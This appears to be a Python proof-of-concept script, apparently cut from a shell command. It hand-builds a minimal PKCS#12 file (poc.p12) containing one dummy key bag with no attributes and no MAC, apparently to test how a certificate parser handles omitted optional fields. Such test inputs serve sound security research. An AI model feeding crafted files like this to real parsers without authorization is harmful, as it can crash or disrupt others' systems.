import struct

def der_encode_length(length):
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return bytes([0x81, length])
    elif length < 0x10000:
        return bytes([0x82, (length >> 8) & 0xff, length & 0xff])
    else:
        return bytes([0x83, (length >> 16) & 0xff, (length >> 8) & 0xff, length & 0xff])

def der_sequence(contents):
    data = b''.join(contents)
    return b'\x30' + der_encode_length(len(data)) + data

def der_set(contents):
    data = b''.join(contents)
    return b'\x31' + der_encode_length(len(data)) + data

def der_oid(oid_str):
    parts = [int(x) for x in oid_str.split('.')]
    encoded = bytes([40 * parts[0] + parts[1]])
    for p in parts[2:]:
        if p < 128:
            encoded += bytes([p])
        elif p < 16384:
            encoded += bytes([0x80 | (p >> 7), p & 0x7f])
        else:
            # handle larger values
            octets = []
            while p > 0:
                octets.append(p & 0x7f)
                p >>= 7
            octets.reverse()
            for i in range(len(octets)-1):
                octets[i] |= 0x80
            encoded += bytes(octets)
    return b'\x06' + der_encode_length(len(encoded)) + encoded

def der_integer(value):
    if value == 0:
        return b'\x02\x01\x00'
    octets = []
    v = value
    while v > 0:
        octets.append(v & 0xff)
        v >>= 8
    octets.reverse()
    if octets[0] & 0x80:
        octets.insert(0, 0)
    data = bytes(octets)
    return b'\x02' + der_encode_length(len(data)) + data

def der_octet_string(data):
    return b'\x04' + der_encode_length(len(data)) + data

def der_explicit(tag, content):
    return bytes([0xa0 | tag]) + der_encode_length(len(content)) + content

# OIDs
DATA_OID = '1.2.840.113549.1.7.1'
# bagId for PKCS8 shrouded key bag
BAG_PKCS8_KEY = '1.2.840.113549.1.12.10.1.1'
BAG_PKCS8_ENCRYPTED_KEY = '1.2.840.113549.1.12.10.1.2'
BAG_CERTIFICATE = '1.2.840.113549.1.12.10.1.3'

# Create a SafeBag with bagId=keyBag, bagValue=some dummy data, NO bagAttributes
bag_value_content = der_sequence([der_integer(0), der_sequence([der_oid('1.2.840.113549.1.1.1'), b'\x05\x00']), der_octet_string(b'\x00' * 8)])
safe_bag = der_sequence([
    der_oid(BAG_PKCS8_KEY),
    der_explicit(0, bag_value_content),
    # NO bagAttributes - this is OPTIONAL and omitted
])

# SafeContents = SEQUENCE OF SafeBag
safe_contents = der_sequence([safe_bag])

# Inner ContentInfo: contentType=DATA_OID, content=[0] OCTET STRING(SafeContents)
inner_content_info = der_sequence([
    der_oid(DATA_OID),
    der_explicit(0, der_octet_string(safe_contents))
])

# AuthenticatedSafe = SEQUENCE OF ContentInfo
auth_safe = der_sequence([inner_content_info])

# Outer ContentInfo (authSafe): contentType=DATA_OID, content=[0] OCTET STRING(AuthenticatedSafe)
auth_safe_content_info = der_sequence([
    der_oid(DATA_OID),
    der_explicit(0, der_octet_string(auth_safe))
])

# PFX = SEQUENCE { version INTEGER, authSafe ContentInfo, macData OPTIONAL }
pfx = der_sequence([
    der_integer(3),
    auth_safe_content_info
])

with open('/workspace/poc.p12', 'wb') as f:
    f.write(pfx)

print(f'Written {len(pfx)} bytes')
print('Hex:', pfx.hex())
"

